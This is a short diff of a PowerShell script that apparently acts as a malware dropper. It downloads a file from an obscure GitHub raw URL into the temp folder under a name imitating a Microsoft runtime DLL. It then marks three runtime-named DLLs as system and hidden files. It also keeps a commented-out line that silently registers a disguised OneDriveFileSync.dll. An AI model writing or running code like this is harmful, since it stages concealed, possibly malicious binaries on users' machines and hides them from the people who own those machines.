@@ -19,4 +19,9 @@ $source = "https://raw.githubusercontent.com/Neth3N/na9ow3495raygwi4gyrhuawerawe
 $destination = "$env:tmp\vcruntime140_1.dll"
 Invoke-WebRequest -Uri $source -OutFile $destination
 
-start powershell -windowstyle h -args 'sleep 10;REGSVR32 /s $env:tmp\OneDriveFileSync.dll'
+sleep 10
+attrib +s +h "$env:tmp\msvcp140.dll"
+attrib +s +h "$env:tmp\vcruntime140.dll"
+attrib +s +h "$env:tmp\vcruntime140_1.dll"
+
+#start powershell -windowstyle h -args 'sleep 10;REGSVR32 /s $env:tmp\OneDriveFileSync.dll'
